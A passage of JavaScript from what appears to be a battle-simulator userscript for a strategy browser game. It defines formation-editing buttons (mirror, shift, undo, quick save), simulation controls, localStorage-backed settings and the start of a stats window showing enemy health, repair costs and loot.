                            btnShiftDown.addListener("mouseover", function (e) { e.getTarget().set({opacity: 1.0}); }, this); 
                            btnShiftDown.addListener("mouseout", function (e) { e.getTarget().set({opacity: 0.3}); }, this); 
                            btnHBox.add(new qx.ui.core.Spacer(), {flex: 1}); 
                            btnHBox.add(btnMirrorV); 
                            btnHBox.add(new qx.ui.core.Spacer().set({ width: 2 })); 
                            btnHBox.add(btnShiftUp); 
                            btnHBox.add(btnShiftDown); 
                            btnHBox.add(new qx.ui.core.Spacer(), {flex: 1}); 
                        } 
 
                        //Formation Mirror Buttons// 
                        this.mirrorBtnH = new qx.ui.form.Button("", img.Flip.H).set({toolTipText: "Mirrors current army formation layout", show: "icon", width: 35, height: 35, center: true, alignY: "middle", appearance: "button-text-small"}); 
                        this.mirrorBtnH.getChildControl("icon").set({width: 20, height: 20, scale: true}); 
                        this.mirrorBtnH.addListener("click", function () { this.mirrorFormation("h"); }, this); 
                        this.mirrorBtnH.hide(); 
                        this.playArea.add(this.mirrorBtnH, {left: null, right: 6, bottom: 160}); 
 
                        this.mirrorBtnV = new qx.ui.form.Button("", img.Flip.V).set({toolTipText: "Mirrors current army formation layout", show: "icon", width: 35, height: 35, center: true, alignY: "middle", appearance: "button-text-small"}); 
                        this.mirrorBtnV.getChildControl("icon").set({width: 20, height: 20, scale: true}); 
                        this.mirrorBtnV.addListener("click", function () { this.mirrorFormation("v"); }, this); 
                        this.mirrorBtnV.hide(); 
                        this.playArea.add(this.mirrorBtnV, {left: null, right: 46, bottom: 160}); 
 
                        //Disable all Units Button// 
                        this.disableAllUnitsBtn = new qx.ui.form.Button("", img.DisableUnit).set({toolTipText: "Enables/Disables all units", show: "icon", width: 35, height: 35, center: true, alignY: "middle", appearance: "button-text-small"}); 
                        this.disableAllUnitsBtn.getChildControl("icon").set({width: 20, height: 20, scale: true}); 
                        this.disableAllUnitsBtn.addListener("click", function () { this.shiftFormation("n"); }, this); 
                        this.disableAllUnitsBtn.hide(); 
                        this.playArea.add(this.disableAllUnitsBtn, {left: null, right: 6, bottom: 120}); 
 
                        //Undo Button// 
                        this.armyUndoBtn = new qx.ui.form.Button("", img.Undo).set({toolTipText: "Undo's formation to previous saved formation.<br>Save formations by hitting<br>the Update or Simulate button.", show: "icon", width: 35, height: 35, center: true, alignY: "middle", appearance: "button-text-small"}); 
                        this.armyUndoBtn.getChildControl("icon").set({width: 20, height: 20, scale: true}); 
                        this.armyUndoBtn.addListener("click", function () { this.undoCurrentFormation(); }, this); 
                        this.armyUndoBtn.setEnabled(false); 
                        this.armyUndoBtn.hide(); 
                        this.playArea.add(this.armyUndoBtn, {left: null, right: 6, bottom: 200}); 
 
                        //Quick Save Button// 
                        this.quickSaveBtn = new qx.ui.form.Button("QS").set({toolTipText: "Saves the current layout<br>without having to open<br>the Formation Saver window.<br>Does not make persistent.", width: 35, height: 35, alignY: "middle", appearance: "button-text-small"}); 
                        this.quickSaveBtn.addListener("click", function () { Simulator.LayoutWindow.getInstance().saveNewLayout(true); }, this); 
                        this.quickSaveBtn.hide(); 
                        this.playArea.add(this.quickSaveBtn, {left: null, right: 6, bottom: 240}); 
 
                        //Simulator Back Button// 
                        this.backBtn = new qx.ui.form.Button("Back").set({toolTipText: "Return to Combat Setup", width: 50, height: 24, appearance: "button-text-small"}); 
                        this.backBtn.addListener("click", function () { this.backToCombatSetup(); }, this); 
                        this.replayBar.add(this.backBtn, {top: 37, left: 255}); 
 
                        this.replayStatBtn = new qx.ui.form.Button("Stats").set({toolTipText: "Return to Combat Setup", width: 50, height: 24, appearance: "button-text-small"}); 
                        this.replayStatBtn.addListener("click", function () { this.__openStatWindow(); }, this); 
                        this.replayBar.add(this.replayStatBtn, {top: 7, left: 255}); 
 
                        phe.cnc.Util.attachNetEvent(ClientLib.Vis.VisMain.GetInstance(), "ViewModeChange", ClientLib.Vis.ViewModeChange, this, this._onViewChanged); 
                    } catch (e) { 
                        console.log("Error setting up Simulator Constructor: "); 
                        console.log(e.toString()); 
                    } 
                }, 
 
                destruct: function () {}, 
 
                members: { 
                    armyBar: null, 
                    playArea: null, 
                    replayBar: null, 
                    isSimButtonDisabled: null, 
                    armyTempFormations: null, 
                    armyTempIdx: null, 
                    isSimulation: null, 
                    simBtn: null, 
                    optionBtn: null, 
                    statBtn: null, 
                    layoutBtn: null, 
                    unlockCmtBtn: null, 
                    unlockRTBtn: null, 
                    shiftUpBtn: null, 
                    shiftDownBtn: null, 
                    shiftLeftBtn: null, 
                    shiftRightBtn: null, 
                    disableAllUnitsBtn: null, 
                    armyUndoBtn: null, 
                    quickSaveBtn: null, 
                    backBtn: null, 
                    replayStatBtn: null, 
                    _onViewChanged: function (oldMode, newMode) { 
                        try { 
                            if (newMode != ClientLib.Vis.Mode.CombatSetup && newMode != ClientLib.Vis.Mode.Battleground) { 
                                Simulator.getInstance().armyTempFormations = []; 
                                Simulator.getInstance().armyTempIdx = 0; 
                                Simulator.getInstance().armyUndoBtn.setEnabled(false); 
                                Simulator.getInstance().isSimulation = false; 
                                localStorage['allUnitsDisabled'] = "no"; 
                            } else if (newMode == ClientLib.Vis.Mode.CombatSetup && oldMode != ClientLib.Vis.Mode.Battleground) { 
                                Simulator.getInstance().saveTempFormation(); 
                            } 
 
                            var cityId = ClientLib.Data.MainData.GetInstance().get_Cities().get_CurrentCity().get_Id(); 
                            var ownCityId = ClientLib.Data.MainData.GetInstance().get_Cities().get_CurrentOwnCity().get_Id(); 
                            if (ClientLib.Data.MainData.GetInstance().get_Cities().get_CurrentCity() !== null) { 
                                if (newMode == ClientLib.Vis.Mode.Battleground || cityId == ownCityId) { 
                                    Simulator.getInstance().shiftUpBtn.hide(); 
                                    Simulator.getInstance().shiftDownBtn.hide(); 
                                    Simulator.getInstance().shiftLeftBtn.hide(); 
                                    Simulator.getInstance().shiftRightBtn.hide(); 
                                    Simulator.getInstance().disableAllUnitsBtn.hide(); 
                                    Simulator.getInstance().mirrorBtnH.hide(); 
                                    Simulator.getInstance().mirrorBtnV.hide(); 
                                    Simulator.getInstance().armyUndoBtn.hide(); 
                                    Simulator.getInstance().quickSaveBtn.hide(); 
                                } else if (cityId != ownCityId) { 
                                    Simulator.getInstance().shiftUpBtn.show(); 
                                    Simulator.getInstance().shiftDownBtn.show(); 
                                    Simulator.getInstance().shiftLeftBtn.show(); 
                                    Simulator.getInstance().shiftRightBtn.show(); 
                                    Simulator.getInstance().disableAllUnitsBtn.show(); 
                                    Simulator.getInstance().mirrorBtnH.show(); 
                                    Simulator.getInstance().mirrorBtnV.show(); 
                                    Simulator.getInstance().armyUndoBtn.show(); 
                                    Simulator.getInstance().quickSaveBtn.show(); 
                                } 
                            } 
                        } catch (e) { 
                            console.log("Error closing windows or hiding buttons on view change"); 
                            console.log(e.toString()); 
                        } 
                    }, 
                    __openSimulatorWindow: function () { 
                        var city = ClientLib.Data.MainData.GetInstance().get_Cities().get_CurrentCity(); 
                        if (city != null) { 
                            var ownCity = ClientLib.Data.MainData.GetInstance().get_Cities().get_CurrentOwnCity(); 
 
                            this.isSimulation = true; 
                            this.saveTempFormation(); 
 
                            localStorage.ta_sim_last_city = city.get_Id(); 
 
                            ownCity.get_CityArmyFormationsManager().set_CurrentTargetBaseId(city.get_Id()); 
                            ClientLib.API.Battleground.GetInstance().SimulateBattle(); 
                            var app = qx.core.Init.getApplication(); 
 
                            app.getPlayArea().setView(ClientLib.Data.PlayerAreaViewMode.pavmCombatReplay, city.get_Id(), 0, 0); 
 
                            var autoSim = localStorage['autoSimulate']; 
 
                            if (autoSim !== undefined) { 
                                if (autoSim == "yes") { 
                                    var speed = localStorage['simulateSpeed']; 
                                    setTimeout(function () { 
                                        var battleground = ClientLib.Vis.VisMain.GetInstance().get_Battleground(); 
                                        battleground.RestartReplay(); 
                                        battleground.set_ReplaySpeed(parseInt(speed, 10)); 
                                    }, 1000); 
                                } 
                            } 
 
                            if (this.isSimButtonDisabled == false) { 
                                this.disableSimulateButtonTimer(10000); 
                                if (typeof Simulator.StatWindow.getInstance().disableSimulateStatButtonTimer === "function") { 
                                    Simulator.StatWindow.getInstance().disableSimulateStatButtonTimer(10000); 
                                } 
                            } 
 
                            setTimeout(function () { 
                                var battleground = ClientLib.Vis.VisMain.GetInstance().get_Battleground(); 
                                var battleDuration = battleground.get_BattleDuration(); 
                                battleDuration = phe.cnc.Util.getTimespanString(battleDuration); 
                                Simulator.StatWindow.getInstance().sim[Simulator.StatWindow.getInstance().simSelected].Label.Battle.Duration.setValue(battleDuration); 
                            }, 10); 
 
                            if (Simulator.StatWindow.getInstance().simReplayBtn.getEnabled() == false) { 
                                Simulator.StatWindow.getInstance().simReplayBtn.setEnabled(true); 
                            } 
                        } 
                    }, 
                    __openOptionWindow: function () { 
                        try { 
                            if (Simulator.OptionWindow.getInstance().isVisible()) { 
                                console.log("Closing Option Window"); 
                                Simulator.OptionWindow.getInstance().close(); 
                            } else { 
                                console.log("Opening Option Window"); 
                                Simulator.OptionWindow.getInstance().open(); 
                            } 
                        } catch (e) { 
                            console.log("Error Opening or Closing Option Window"); 
                            console.log(e.toString()); 
                        } 
                    }, 
                    __openStatWindow: function () { 
                        try { 
                            if (Simulator.StatWindow.getInstance().isVisible()) { 
                                console.log("Closing Stat Window"); 
                                Simulator.StatWindow.getInstance().close(); 
                            } else { 
                                console.log("Opening Stat Window"); 
                                Simulator.StatWindow.getInstance().open(); 
                            } 
                        } catch (e) { 
                            console.log("Error Opening or Closing Stat Window"); 
                            console.log(e.toString()); 
                        } 
                    }, 
                    __openLayoutWindow: function () { 
                        try { 
                            if (Simulator.LayoutWindow.getInstance().isVisible()) { 
                                console.log("Closing Layout Window"); 
                                Simulator.LayoutWindow.getInstance().close(); 
                            } else { 
                                console.log("Opening LayoutWindow"); 
                                Simulator.LayoutWindow.getInstance().updateLayoutList(); 
                                Simulator.LayoutWindow.getInstance().layoutTextBox.setValue(""); 
                                Simulator.LayoutWindow.getInstance().persistentCheck.setValue(false); 
                                Simulator.LayoutWindow.getInstance().open(); 
                            } 
                        } catch (e) { 
                            console.log("Error Opening or Closing Layout Window"); 
                            console.log(e.toString()); 
                        } 
                    }, 
                    saveTempFormation: function () { 
                        try { 
                            var units = this.getCityPreArmyUnits().get_ArmyUnits().l; 
                            if (this.armyTempFormations.length != 0) { 
                                for (var i = 0; i < units.length; i++) { 
                                    var lastForm = this.armyTempFormations[this.armyTempIdx][i]; 
                                    if ((units[i].get_CoordX() != lastForm.x) || (units[i].get_CoordY() != lastForm.y)) { 
                                        break; 
                                    } else if ((i + 1) == units.length) { 
                                        return; 
                                    } 
                                } 
                            } 
 
                            var formation = new Array(); 
 
                            for (var i = 0; i < units.length; i++) { 
                                var unit = units[i]; 
                                var unitInfo = {}; 
                                unitInfo.x = unit.get_CoordX(); 
                                unitInfo.y = unit.get_CoordY(); 
                                unitInfo.id = unit.get_Id(); 
                                unitInfo.enabled = unit.get_Enabled(); 
 
                                formation.push(unitInfo); 
                            } 
 
                            this.armyTempFormations.push(formation); 
                            this.armyTempIdx = this.armyTempFormations.length - 1; 
                            if (this.armyTempFormations.length > 1) 
                                this.armyUndoBtn.setEnabled(true); 
                        } catch (e) { 
                            console.log("Error Saving Temp Formation"); 
                            console.log(e.toString()); 
                        } 
                    }, 
                    undoCurrentFormation: function () { 
                        try { 
                            this.restoreFormation(this.armyTempFormations[(this.armyTempIdx - 1)]); 
 
                            //get rid of last element now that we have undone it. 
                            this.armyTempFormations.splice(this.armyTempIdx, 1); 
                            this.armyTempIdx--; 
 
                            if (this.armyTempFormations.length == 1) 
                                this.armyUndoBtn.setEnabled(false); 
                        } catch (e) { 
                            console.log("Error undoing formation"); 
                            console.log(e.toString()); 
                        } 
                    }, 
                    mirrorFormation: function (direction, sel) { 
                        /* 
                         * Mirrors across the X/Y Axis 
                         */ 
                        try { 
                            console.log("Shifting Unit Formation"); 
 
                            var units = this.getCityPreArmyUnits().get_ArmyUnits().l; 
 
                            var newLayout = []; 
                            for (var i = 0; i < units.length; i++) { 
                                var unit = units[i], 
                                    armyUnit = {}, 
                                    x = unit.get_CoordX(), 
                                    y = unit.get_CoordY(); 
                                if (direction == "h") x = Math.abs(x - 8); 
                                if (direction == "v") y = Math.abs(y - 3); 
                                if (sel !== undefined && unit.get_CoordY() != sel && direction == "h") armyUnit.x = unit.get_CoordX(); 
                                else armyUnit.x = x; 
                                if (sel !== undefined && unit.get_CoordX() != sel && direction == "v") armyUnit.y = unit.get_CoordY(); 
                                else armyUnit.y = y; 
                                armyUnit.id = unit.get_Id(); 
                                armyUnit.enabled = unit.get_Enabled(); 
                                newLayout.push(armyUnit); 
                            } 
                            this.restoreFormation(newLayout); 
                        } catch (e) { 
                            console.log("Error Mirroring Formation"); 
                            console.log(e.toString()); 
                        } 
                    }, 
                    shiftFormation: function (direction, sel) { 
                        /* 
                         * Code from one of the previous authors of an older simulator version. If anyone knows the true author please let me know. 
                         */ 
                        try { 
                            var v_shift = 0; 
                            var h_shift = 0; 
 
                            //Determines shift direction 
                            if (direction == "u") var v_shift = -1; 
                            if (direction == "d") var v_shift = 1; 
                            if (direction == "l") var h_shift = -1; 
                            if (direction == "r") var h_shift = 1; 
                            //No need to continue 
                            if (v_shift == 0 && h_shift == 0 && direction != "n") 
                                return; 
 
                            var units = this.getCityPreArmyUnits().get_ArmyUnits().l; 
 
                            var newLayout = []; 
                            for (var i = 0; i < units.length; i++) { 
                                var unit = units[i]; 
                                var armyUnit = {}; 
                                var x = unit.get_CoordX() + h_shift; 
                                switch (x) { 
                                case 9: 
                                    x = 0; 
                                    break; 
                                case -1: 
                                    x = 8; 
                                    break; 
                                } 
                                var y = unit.get_CoordY() + v_shift; 
                                switch (y) { 
                                case 4: 
                                    y = 0; 
                                    break; 
                                case -1: 
                                    y = 3; 
                                    break; 
                                } 
                                if (sel !== undefined && unit.get_CoordY() != sel && (direction == "l" || direction == "r")) armyUnit.x = unit.get_CoordX(); 
                                else armyUnit.x = x; 
                                if (sel !== undefined && unit.get_CoordX() != sel && (direction == "u" || direction == "d")) armyUnit.y = unit.get_CoordY(); 
                                else armyUnit.y = y; 
                                armyUnit.id = unit.get_Id(); 
 
                                //For enabling/disabling all units 
                                if (direction == "n") { 
                                    if (localStorage['allUnitsDisabled'] !== undefined) { 
                                        if (localStorage['allUnitsDisabled'] == "yes") { 
                                            armyUnit.enabled = unit.set_Enabled(true); 
                                        } else { 
                                            armyUnit.enabled = unit.set_Enabled(false); 
                                        } 
                                    } else { 
                                        armyUnit.enabled = unit.set_Enabled(false); 
                                    } 
                                } 
                                armyUnit.enabled = unit.get_Enabled(); 
                                newLayout.push(armyUnit); 
                            } 
                            //Change disable button to opposite 
                            if (direction == "n") { 
                                if (localStorage['allUnitsDisabled'] == "yes") 
                                    localStorage['allUnitsDisabled'] = "no"; 
                                else 
                                    localStorage['allUnitsDisabled'] = "yes"; 
                            } 
                            this.restoreFormation(newLayout); 
                        } catch (e) { 
                            console.log("Error Shifting Units"); 
                            console.log(e.toString()); 
                        } 
                    }, 
                    restoreFormation: function (layout) { 
                        try { 
                            var sUnits = layout; 
 
                            var units = this.getCityPreArmyUnits(); 
                            var units_list = units.get_ArmyUnits().l; 
 
                            for (var idx = 0; idx < sUnits.length; idx++) 
                            { 
                                var saved_unit = sUnits[idx]; 
                                var uid = saved_unit.id; 
                                for (var i = 0; i < units_list.length; i++) 
                                { 
                                    if (units_list[i].get_Id() === uid) 
                                    { 
                                        units_list[i].MoveBattleUnit(saved_unit.x, saved_unit.y); 
                                        if (saved_unit.enabled === undefined) 
                                            units_list[i].set_Enabled(true); 
                                        else 
                                            units_list[i].set_Enabled(saved_unit.enabled); 
                                    } 
                                } 
                            } 
                            units.UpdateFormation(true); 
                        } catch (e) { 
                            console.log("Error Restoring Formation"); 
                            console.log(e.toString()); 
                        } 
                    }, 
                    getCityPreArmyUnits: function () { 
                        var city = ClientLib.Data.MainData.GetInstance().get_Cities().get_CurrentCity(); 
                        var ownCity = ClientLib.Data.MainData.GetInstance().get_Cities().get_CurrentOwnCity(); 
                        var formationManager = ownCity.get_CityArmyFormationsManager(); 
                        formationManager.set_CurrentTargetBaseId(city.get_Id()); 
                        return formationManager.GetFormationByTargetBaseId(formationManager.get_CurrentTargetBaseId()); 
                    }, 
                    timeoutCmtBtn: function () { 
                        this.unlockCmtBtn.exclude(); 
                        setTimeout(function () { 
                            Simulator.getInstance().unlockCmtBtn.show(); 
                        }, 3000); 
                    }, 
                    timeoutRTBtn: function () { 
                        this.unlockRTBtn.exclude(); 
                        setTimeout(function () { 
                            Simulator.getInstance().unlockRTBtn.show(); 
                        }, 3000); 
                    }, 
                    backToCombatSetup: function () { 
                        try { 
                            var city = ClientLib.Data.MainData.GetInstance().get_Cities().get_CurrentCity(); 
                            if (city != null) { 
                                var app = qx.core.Init.getApplication(); 
                                app.getPlayArea().setView(ClientLib.Data.PlayerAreaViewMode.pavmCombatSetupDefense, city.get_Id(), 0, 0); 
                            } 
                        } catch (e) { 
                            console.log("Error closing Simulation Window"); 
                            console.log(e.toString()); 
                        } 
                    }, 
                    disableSimulateButtonTimer: function (timer) { 
                        try { 
                            if (timer >= 1000) { 
                                this.isSimButtonDisabled = true; 
                                this.simBtn.setEnabled(false); 
                                this.simBtn.setLabel(Math.floor(timer / 1000)); 
                                timer -= 1000; 
                                setTimeout(function () { 
                                    Simulator.getInstance().disableSimulateButtonTimer(timer); 
                                }, 1000); 
                            } else { 
                                setTimeout(function () { 
                                    Simulator.getInstance().simBtn.setEnabled(true); 
                                    if (Simulator.OptionWindow.getInstance()._buttonSizeCB.getValue()) 
                                        Simulator.getInstance().simBtn.setLabel("Simulate"); 
                                    else 
                                        Simulator.getInstance().simBtn.setLabel("S"); 
                                }, timer); 
                                this.isSimButtonDisabled = false; 
                            } 
                        } catch (e) { 
                            console.log("Error disabling simulator button"); 
                            console.log(e.toString()); 
                        } 
                    }, 
                    hideArmyTooltips: function () { 
                        try { 
                            if (localStorage["ArmyUnitTooltipDisabled"] === undefined) localStorage["ArmyUnitTooltipDisabled"] = "yes"; 
                            var Baseview = ClientLib.Vis.BaseView.BaseView.prototype; 
                            for (var i in Baseview) { 
                                if (typeof Baseview[i] === "function" && Baseview[i] === Baseview.ShowToolTip) { 
                                    Baseview.ShowToolTip2 = Baseview[i]; 
                                    Baseview[i] = function (a) { 
                                        if (ClientLib.Vis.VisMain.GetInstance().get_Mode() == ClientLib.Vis.Mode.CombatSetup && localStorage['ArmyUnitTooltipDisabled'] == 'yes') return; 
                                        else this.ShowToolTip2(a); 
                                    }; 
                                    break; 
                                } 
                            } 
                            var ArmyUnitTooltipOverlay = qx.core.Init.getApplication().getArmyUnitTooltipOverlay(); 
                            ArmyUnitTooltipOverlay.setVisibility2 = ArmyUnitTooltipOverlay.setVisibility; 
                            ArmyUnitTooltipOverlay.setVisibility = function (a) { 
                                if (localStorage["ArmyUnitTooltipDisabled"] == "yes") this.setVisibility2(false); 
                                else this.setVisibility2(a); 
                            }; 
                        } catch (e) { 
                            console.log("Error hideArmyTooltips()"); 
                            console.log(e.toString()); 
                        } 
                    } 
                } 
            }); 
            qx.Class.define("Simulator.StatWindow", { 
                type: "singleton", 
                extend: qx.ui.window.Window, 
                construct: function () { 
                    try { 
                        this.base(arguments); 
 
                        this.set({ 
                            layout: new qx.ui.layout.VBox().set({ 
                                spacing: 0 
                            }), 
                            caption: "Simulator Stats", 
                            icon: "FactionUI/icons/icon_res_plinfo_command_points.png", 
                            contentPadding: 5, 
                            contentPaddingTop: 0, 
                            allowMaximize: false, 
                            showMaximize: false, 
                            allowMinimize: false, 
                            showMinimize: false, 
                            resizable: true, 
                            resizableTop: false, 
                            resizableBottom: false 
                        }); 
                        this.getChildControl("icon").set({ width : 18, height : 18, scale : true, alignY : "middle" }); 
 
                        if (localStorage['statWindowPosLeft'] !== undefined) { 
                            var left = parseInt(localStorage['statWindowPosLeft'], 10); 
                            var top = parseInt(localStorage['statWindowPosTop'], 10); 
                            this.moveTo(left, top); 
                        } else { 
                            this.moveTo(124, 31); 
                        } 
 
                        if (localStorage['simViews'] !== undefined) { 
                            this.simViews = parseInt(localStorage['simViews'], 10); 
                        } else { 
                            this.simViews = 3; 
                        } 
 
                        var qxApp = qx.core.Init.getApplication(); 
                        this.isSimStatButtonDisabled = false; 
 
                        /** 
                         *   Setup Images 
                         */ 
 
                        var img = { 
                            Enemy: { 
                                All: "FactionUI/icons/icon_arsnl_show_all.png", 
                                Base: "FactionUI/icons/icon_arsnl_base_buildings.png", 
                                Defense: "FactionUI/icons/icon_def_army_points.png" 
                            }, 
                            Defense: { 
                                Infantry: "FactionUI/icons/icon_arsnl_def_squad.png", 
                                Vehicle: "FactionUI/icons/icon_arsnl_def_vehicle.png", 
                                Building: "FactionUI/icons/icon_arsnl_def_building.png" 
                            }, 
                            Offense: { 
                                Infantry: "FactionUI/icons/icon_arsnl_off_squad.png", 
                                Vehicle: "FactionUI/icons/icon_arsnl_off_vehicle.png", 
                                Aircraft: "FactionUI/icons/icon_arsnl_off_plane.png" 
                            }, 
                            Repair: { 
                                Storage: "webfrontend/ui/icons/icn_repair_points.png", 
                                Overall: "webfrontend/ui/icons/icn_repair_off_points.png", 
                                Infantry: "webfrontend/ui/icons/icon_res_repair_inf.png", 
                                Vehicle: "webfrontend/ui/icons/icon_res_repair_tnk.png", 
                                Aircraft: "webfrontend/ui/icons/icon_res_repair_air.png" 
                            }, 
                            Loot: { 
                                Tiberium: "webfrontend/ui/common/icn_res_tiberium.png", 
                                Crystal: "webfrontend/ui/common/icn_res_chrystal.png", 
                                Credits: "webfrontend/ui/common/icn_res_dollar.png", 
                                RP: "webfrontend/ui/common/icn_res_research_mission.png", 
                                Total: "FactionUI/icons/icon_transfer_resource.png" 
                            } 
                        }; 
 
                        /** 
                         *   Setup Stats Window 
                         */ 
 
                        //Battle Section// 
                        this.Battle = new qx.ui.container.Composite(new qx.ui.layout.HBox(-3)).set({decorator: "pane-light-plain", allowGrowX: true, marginLeft: 0, marginRight: 0}); 
                        var BattleLables = new qx.ui.container.Composite(new qx.ui.layout.VBox()).set({width: 29, padding: 5, allowGrowX: true, marginLeft: 0, marginRight: 0}); 
 
                        var BattleOutcome = new qx.ui.basic.Label("O").set({toolTipText: qxApp.tr("tnf:combat report"), alignX: "center", alignY: "middle"}); 
                        var BattleDuration = new qx.ui.basic.Label("D").set({toolTipText: qxApp.tr("tnf:combat timer npc: %1", ""), alignX: "center", alignY: "middle"}); 
                        var BattleOwnCity = new qx.ui.basic.Label("B").set({toolTipText: qxApp.tr("tnf:base"), alignX: "center", alignY: "middle"}); 
 
                        BattleLables.add(BattleOutcome); 
                        BattleLables.add(BattleDuration); 
                        BattleLables.add(BattleOwnCity); 
                        this.Battle.add(BattleLables); 
                        this.add(this.Battle); 
 
                        //Enemy Health Section// 
                        var EnemyHealthHeader = new qx.ui.container.Composite(new qx.ui.layout.VBox(5)).set({decorator: "pane-light-opaque"}); 
                        EnemyHealthHeader.add(new qx.ui.basic.Label(qxApp.tr("tnf:combat target")).set({alignX: "center", alignY: "middle", paddingBottom: 5, font: "font_size_13_bold"})); 
                        this.add(EnemyHealthHeader); 
 
                        this.EnemyHealth = new qx.ui.container.Composite(new qx.ui.layout.HBox(-3)).set({decorator: "pane-light-plain", allowGrowX: true, marginLeft: 0, marginRight: 0}); 
                        var EnemyHealthLabels = new qx.ui.container.Composite(new qx.ui.layout.VBox()).set({width: 29, padding: 5, allowGrowX: true, marginLeft: 0, marginRight: 0}); 
 
                        var EnemyHealthLabelOverall = new qx.ui.basic.Atom(null, img.Enemy.All).set({toolTipText: qxApp.tr("tnf:total"), toolTipIcon: img.Enemy.All, alignX: "center", alignY: "middle", gap: 0, iconPosition: "top"}); 
                        var EnemyHealthLabelBase = new qx.ui.basic.Atom(null, img.Enemy.Base).set({toolTipText: qxApp.tr("tnf:base"), toolTipIcon: img.Enemy.Base, alignX: "center", alignY: "middle", gap: 0, iconPosition: "top"}); 
                        var EnemyHealthLabelDefense = new qx.ui.basic.Atom(null, img.Enemy.Defense).set({toolTipText: qxApp.tr("tnf:defense"), toolTipIcon: img.Enemy.Defense, alignX: "center", alignY: "middle", gap: 0, iconPosition: "top"}); 
                        var EnemyHealthLabelCY = new qx.ui.basic.Label("CY").set({toolTipText: GAMEDATA.Tech[1].dn, alignX: "center", alignY: "middle"}); 
                        var EnemyHealthLabelDF = new qx.ui.basic.Label("DF").set({toolTipText: GAMEDATA.Tech[42].dn, alignX: "center", alignY: "middle"}); 
                        var EnemyHealthLabelCC = new qx.ui.basic.Label("CC").set({toolTipText: GAMEDATA.Tech[24].dn, alignX: "center", alignY: "middle"}); 
 
                        EnemyHealthLabelOverall.getChildControl("icon").set({width: 18, height: 18, scale: true, alignY : "middle"}); 
                        EnemyHealthLabelBase.getChildControl("icon").set({width: 18, height: 18, scale: true, alignY : "middle"}); 
                        EnemyHealthLabelDefense.getChildControl("icon").set({width: 18, height: 18, scale: true, alignY : "middle"}); 
 
                        EnemyHealthLabels.add(EnemyHealthLabelOverall); 
                        EnemyHealthLabels.add(EnemyHealthLabelBase); 
                        EnemyHealthLabels.add(EnemyHealthLabelDefense); 
                        EnemyHealthLabels.add(EnemyHealthLabelCY); 
                        EnemyHealthLabels.add(EnemyHealthLabelDF); 
                        EnemyHealthLabels.add(EnemyHealthLabelCC); 
                        this.EnemyHealth.add(EnemyHealthLabels); 
                        this.add(this.EnemyHealth); 
 
                        //Repair Section// 
                        var RepairHeader = new qx.ui.container.Composite(new qx.ui.layout.VBox(5)).set({decorator: "pane-light-opaque"}); 
                        RepairHeader.add(new qx.ui.basic.Label(qxApp.tr("tnf:own repair cost")).set({alignX: "center", alignY: "middle", paddingBottom: 5, font: "font_size_13_bold"})); 
                        this.add(RepairHeader); 
 
                        this.Repair = new qx.ui.container.Composite(new qx.ui.layout.HBox(-3)).set({decorator: "pane-light-plain", allowGrowX: true, marginLeft: 0, marginRight: 0}); 
                        var RepairLabels = new qx.ui.container.Composite(new qx.ui.layout.VBox()).set({width: 29, padding: 5, allowGrowX: true, marginLeft: 0, marginRight: 0}); 
 
                        var pRLabelStorage = new qx.ui.basic.Atom(null, img.Repair.Storage).set({toolTipText: qxApp.tr("tnf:offense repair time"), toolTipIcon: img.Repair.Storage, alignX: "center", alignY: "middle", gap: 0, iconPosition: "top"}); 
                        var pRLabelOverall = new qx.ui.basic.Atom(null, img.Repair.Overall).set({toolTipText: qxApp.tr("tnf:repair points"), toolTipIcon: img.Repair.Overall, alignX: "center", alignY: "middle", gap: 0, iconPosition: "top"}); 
                        var pRLabelInf = new qx.ui.basic.Atom(null, img.Repair.Infantry).set({toolTipText: qxApp.tr("tnf:infantry repair title"), toolTipIcon: img.Repair.Infantry, alignX: "center", alignY: "middle", gap: 0, iconPosition: "top"}); 
                        var pRLabelVehi = new qx.ui.basic.Atom(null, img.Repair.Vehicle).set({toolTipText: qxApp.tr("tnf:vehicle repair title"), toolTipIcon: img.Repair.Vehicle, alignX: "center", alignY: "middle", gap: 0, iconPosition: "top"}); 
                        var pRLabelAir = new qx.ui.basic.Atom(null, img.Repair.Aircraft).set({toolTipText: qxApp.tr("tnf:aircraft repair title"), toolTipIcon: img.Repair.Aircraft, alignX: "center", alignY: "middle", gap: 0, iconPosition: "top"}); 
 
                        pRLabelStorage.getChildControl("icon").set({width: 18, height: 18, scale: true, alignY : "middle"}); 
                        pRLabelOverall.getChildControl("icon").set({width: 18, height: 18, scale: true, alignY : "middle"}); 
                        pRLabelInf.getChildControl("icon").set({width: 18, height: 18, scale: true, alignY : "middle"}); 
                        pRLabelVehi.getChildControl("icon").set({width: 18, height: 18, scale: true, alignY : "middle"}); 
                        pRLabelAir.getChildControl("icon").set({width: 18, height: 18, scale: true, alignY : "middle"}); 
 
                        RepairLabels.add(pRLabelStorage); 
                        RepairLabels.add(pRLabelOverall); 
                        RepairLabels.add(pRLabelInf); 
                        RepairLabels.add(pRLabelVehi); 
                        RepairLabels.add(pRLabelAir); 
                        this.Repair.add(RepairLabels); 
                        this.add(this.Repair); 
 
                        //Loot Section// 
                        var LootHeader = new qx.ui.container.Composite(new qx.ui.layout.VBox(5)).set({decorator: "pane-light-opaque"}); 
                        LootHeader.add(new qx.ui.basic.Label(qxApp.tr("tnf:lootable resources:")).set({alignX: "center", alignY: "middle", paddingBottom: 5, font: "font_size_13_bold"})); 
                        this.add(LootHeader); 
 
                        this.Loot = new qx.ui.container.Composite(new qx.ui.layout.HBox(-3)).set({decorator: "pane-light-plain", allowGrowX: true, marginLeft: 0, marginRight: 0}); 
                        var LootLabels = new qx.ui.container.Composite(new qx.ui.layout.VBox()).set({width: 29, padding: 5, allowGrowX: true, marginLeft: 0, marginRight: 0}); 
 
                        var LootLabelTib = new qx.ui.basic.Atom(null, img.Loot.Tiberium).set({toolTipText: qxApp.tr("tnf:tiberium"), toolTipIcon: img.Loot.Tiberium, alignX: "center", alignY: "middle", gap: 0, iconPosition: "top"}); 
                        var LootLabelCry = new qx.ui.basic.Atom(null, img.Loot.Crystal).set({toolTipText: qxApp.tr("tnf:crystals"), toolTipIcon: img.Loot.Crystal, alignX: "center", alignY: "middle", gap: 0, iconPosition: "top"}); 
                        var LootLabelCred = new qx.ui.basic.Atom(null, img.Loot.Credits).set({toolTipText: qxApp.tr("tnf:credits"), toolTipIcon: img.Loot.Credits, alignX: "center", alignY: "middle", gap: 0, iconPosition: "top"}); 
                        var LootLabelRP = new qx.ui.basic.Atom(null, img.Loot.RP).set({toolTipText: qxApp.tr("tnf:research points"), toolTipIcon: img.Loot.RP, alignX: "center", alignY: "middle", gap: 0, iconPosition: "top"}); 
